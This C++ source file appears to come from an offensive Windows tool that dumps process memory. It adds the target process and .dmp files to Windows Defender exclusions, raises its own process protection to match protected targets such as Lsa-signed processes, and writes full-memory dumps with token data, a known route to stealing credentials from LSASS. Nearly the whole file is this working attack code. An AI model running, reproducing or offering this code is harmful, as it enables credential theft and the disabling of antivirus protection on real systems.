// ControllerMemoryOperations.cpp
#include "Controller.h"
#include "common.h"
#include "Utils.h"
#include <DbgHelp.h>

extern volatile bool g_interrupted;

// Atomic memory dump operations with comprehensive process validation
bool Controller::DumpProcess(DWORD pid, const std::wstring& outputPath) noexcept {
    return CreateMiniDump(pid, outputPath);
}

bool Controller::DumpProcessByName(const std::wstring& processName, const std::wstring& outputPath) noexcept {
    if (!PerformAtomicInitWithErrorCleanup()) {
        return false;
    }
    
    auto matches = FindProcessesByName(processName);
    
    if (matches.empty()) {
        ERROR(L"No process found matching pattern: %s", processName.c_str());
        PerformAtomicCleanup();
        return false;
    }
    
    if (matches.size() > 1) {
        ERROR(L"Multiple processes found matching pattern '%s'. Please use a more specific name:", processName.c_str());
        for (const auto& match : matches) {
            std::wcout << L"  PID " << match.Pid << L": " << match.ProcessName << L"\n";
        }
        PerformAtomicCleanup();
        return false;
    }
    
    auto match = matches[0];
    INFO(L"Found process: %s (PID %d)", match.ProcessName.c_str(), match.Pid);
    
    PerformAtomicCleanup();
    
    return CreateMiniDump(match.Pid, outputPath);
}

// Create comprehensive memory dump with protection elevation and Defender bypass
bool Controller::CreateMiniDump(DWORD pid, const std::wstring& outputPath) noexcept {
    if (!PerformAtomicInit()) {
        return false;
    }
    
    if (g_interrupted) {
        INFO(L"Operation cancelled by user before start");
        PerformAtomicCleanup();
        return false;
    }
    
    std::wstring processName = Utils::GetProcessName(pid);

    // Try to add process to Defender exclusions to prevent interference during dumping
    std::wstring processNameWithExt = processName;
    if (processNameWithExt.find(L".exe") == std::wstring::npos) {
        processNameWithExt += L".exe";
    }
    
    if (!m_trustedInstaller.AddProcessToDefenderExclusions(processName)) {
        INFO(L"AV exclusion skipped: %s", processName.c_str());
    }
	
	if (!m_trustedInstaller.AddExtensionExclusion(L"dmp")) {
    INFO(L"AV extension exclusion skipped: .dmp");
	}

    // System process validation - these processes cannot be dumped
    if (pid == 4 || processName == L"System") {
        ERROR(L"Cannot dump System process (PID %d) - Windows kernel process, undumpable by design", pid);
        m_trustedInstaller.RemoveProcessFromDefenderExclusions(processName);
        PerformAtomicCleanup();
        return false;
    }

    if (pid == 188 || processName == L"Secure System") {
        ERROR(L"Cannot dump Secure System process (PID %d) - VSM/VBS protected process, undumpable", pid);
        m_trustedInstaller.RemoveProcessFromDefenderExclusions(processName);
        PerformAtomicCleanup();
        return false;
    }

    if (pid == 232 || processName == L"Registry") {
        ERROR(L"Cannot dump Registry process (PID %d) - kernel registry subsystem, undumpable", pid);
        m_trustedInstaller.RemoveProcessFromDefenderExclusions(processName);
        PerformAtomicCleanup();
        return false;
    }

    if (processName == L"Memory Compression" || pid == 3052) {
        ERROR(L"Cannot dump Memory Compression process (PID %d) - kernel memory manager, undumpable", pid);
        m_trustedInstaller.RemoveProcessFromDefenderExclusions(processName);
        PerformAtomicCleanup();
        return false;
    }

    if (pid < 100 && pid != 0) {
        INFO(L"Warning: Attempting to dump low PID process (%d: %s) - may fail due to system-level protection", 
             pid, processName.c_str());
    }

    if (g_interrupted) {
        INFO(L"Operation cancelled by user during validation");
        m_trustedInstaller.RemoveProcessFromDefenderExclusions(processName);
        PerformAtomicCleanup();
        return false;
    }

    // Get target process protection level for elevation - this is auxiliary
    auto kernelAddr = GetProcessKernelAddress(pid);
    if (!kernelAddr) {
        INFO(L"Could not get kernel address for target process (continuing without self-protection)");
    }

    auto targetProtection = std::optional<UCHAR>{};
    if (kernelAddr) {
        targetProtection = GetProcessProtection(kernelAddr.value());
        if (!targetProtection) {
            INFO(L"Could not get protection info for target process (continuing without self-protection)");
        }
    }

    if (g_interrupted) {
        INFO(L"Operation cancelled by user before protection setup");
        m_trustedInstaller.RemoveProcessFromDefenderExclusions(processName);
        PerformAtomicCleanup();
        return false;
    }

    // Protection elevation to match target process level - auxiliary feature
    if (targetProtection && targetProtection.value() > 0) {
        UCHAR targetLevel = Utils::GetProtectionLevel(targetProtection.value());
        UCHAR targetSigner = Utils::GetSignerType(targetProtection.value());

        std::wstring levelStr = (targetLevel == static_cast<UCHAR>(PS_PROTECTED_TYPE::Protected)) ? L"PP" : L"PPL";
        std::wstring signerStr = L"Unknown";

        switch (static_cast<PS_PROTECTED_SIGNER>(targetSigner)) {
            case PS_PROTECTED_SIGNER::Lsa: signerStr = L"Lsa"; break;
            case PS_PROTECTED_SIGNER::WinTcb: signerStr = L"WinTcb"; break;
            case PS_PROTECTED_SIGNER::WinSystem: signerStr = L"WinSystem"; break;
            case PS_PROTECTED_SIGNER::Windows: signerStr = L"Windows"; break;
            case PS_PROTECTED_SIGNER::Antimalware: signerStr = L"Antimalware"; break;
            case PS_PROTECTED_SIGNER::Authenticode: signerStr = L"Authenticode"; break;
            case PS_PROTECTED_SIGNER::CodeGen: signerStr = L"CodeGen"; break;
            case PS_PROTECTED_SIGNER::App: signerStr = L"App"; break;
            default: 
                INFO(L"Unknown signer type - skipping self-protection");
                break;
        }

        if (signerStr != L"Unknown") {
            INFO(L"Target process protection: %s-%s", levelStr.c_str(), signerStr.c_str());

            if (!SelfProtect(levelStr, signerStr)) {
                INFO(L"Self-protection failed: %s-%s (continuing with dump)", levelStr.c_str(), signerStr.c_str());
            } else {
                SUCCESS(L"Self-protection set to %s-%s", levelStr.c_str(), signerStr.c_str());
            }
        }
    } else {
        INFO(L"Target process is not protected, no self-protection needed");
    }

    // Try to enable debug privilege - auxiliary feature
    if (!EnableDebugPrivilege()) {
        INFO(L"Debug privilege failed (continuing with dump anyway)");
    }

    if (g_interrupted) {
        INFO(L"Operation cancelled by user before process access");
        SelfProtect(L"none", L"none");
        m_trustedInstaller.RemoveProcessFromDefenderExclusions(processName);
        PerformAtomicCleanup();
        return false;
    }

    // Open target process with appropriate privileges - CRITICAL operation
    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid);
    if (!hProcess) {
        hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
        if (!hProcess) {
            ERROR(L"Critical: Failed to open process (error: %d)", GetLastError());
            m_trustedInstaller.RemoveProcessFromDefenderExclusions(processName);
            PerformAtomicCleanup();
            return false;
        }
    }

    // Build output path for dump file
    std::wstring fullPath = outputPath;
    if (!outputPath.empty() && outputPath.back() != L'\\')
        fullPath += L"\\";
    fullPath += processName + L"_" + std::to_wstring(pid) + L".dmp";

    // Create dump file - CRITICAL operation
    HANDLE hFile = CreateFileW(fullPath.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        ERROR(L"Critical: Failed to create dump file (error: %d)", GetLastError());
        CloseHandle(hProcess);
        m_trustedInstaller.RemoveProcessFromDefenderExclusions(processName);
        PerformAtomicCleanup();
        return false;
    }

    // Comprehensive dump type for maximum information extraction
    MINIDUMP_TYPE dumpType = static_cast<MINIDUMP_TYPE>(
        MiniDumpWithFullMemory |
        MiniDumpWithHandleData |
        MiniDumpWithUnloadedModules |
        MiniDumpWithFullMemoryInfo |
        MiniDumpWithThreadInfo |
        MiniDumpWithTokenInformation
    );

    if (g_interrupted) {
        INFO(L"Operation cancelled by user before dump creation");
        CloseHandle(hFile);
        CloseHandle(hProcess);
        DeleteFileW(fullPath.c_str());
        SelfProtect(L"none", L"none");
        m_trustedInstaller.RemoveProcessFromDefenderExclusions(processName);
        PerformAtomicCleanup();
        return false;
    }

    INFO(L"Creating memory dump - this may take a while. Press Ctrl+C to cancel safely.");
    
    // Execute the actual memory dump - CRITICAL operation
    BOOL result = MiniDumpWriteDump(hProcess, pid, hFile, dumpType, NULL, NULL, NULL);
    
    if (g_interrupted) {
        INFO(L"Operation was cancelled during dump creation");
        CloseHandle(hFile);
        CloseHandle(hProcess);
        DeleteFileW(fullPath.c_str());
        SelfProtect(L"none", L"none");
        m_trustedInstaller.RemoveProcessFromDefenderExclusions(processName);
        PerformAtomicCleanup();
        return false;
    }
    
    CloseHandle(hFile);
    CloseHandle(hProcess);

    if (!result) {
        DWORD error = GetLastError();
        switch (error) {
            case ERROR_TIMEOUT:
                ERROR(L"Critical: MiniDumpWriteDump timed out - process may be unresponsive or in critical section");
                break;
            case RPC_S_CALL_FAILED:
                ERROR(L"Critical: RPC call failed - process may be a kernel-mode or system-critical process");
                break;
            case ERROR_ACCESS_DENIED:
                ERROR(L"Critical: Access denied - insufficient privileges even with protection bypass");
                break;
            case ERROR_PARTIAL_COPY:
                ERROR(L"Critical: Partial copy - some memory regions could not be read");
                break;
            default:
                ERROR(L"Critical: MiniDumpWriteDump failed (error: %d / 0x%08x)", error, error);
                break;
        }
        DeleteFileW(fullPath.c_str());
        SelfProtect(L"none", L"none");
        m_trustedInstaller.RemoveProcessFromDefenderExclusions(processName);
        PerformAtomicCleanup();
        return false;
    }

    SUCCESS(L"Memory dump created successfully: %s", fullPath.c_str());
    
    // Cleanup phase - these operations are non-critical
    INFO(L"Removing self-protection before cleanup...");
    if (!SelfProtect(L"none", L"none")) {
        DEBUG(L"Self-protection removal failed (non-critical)");
    }
    
    if (g_interrupted) {
        INFO(L"Operation completed but cleanup was interrupted");
        m_trustedInstaller.RemoveProcessFromDefenderExclusions(processName);
        PerformAtomicCleanup();
        return true;
    }
    
    // Clean up Defender exclusions and perform atomic cleanup - non-critical
    if (!m_trustedInstaller.RemoveProcessFromDefenderExclusions(processName)) {
        DEBUG(L"AV cleanup skipped: %s", processName.c_str());
    }
    
    PerformAtomicCleanup();
    
    return true;
}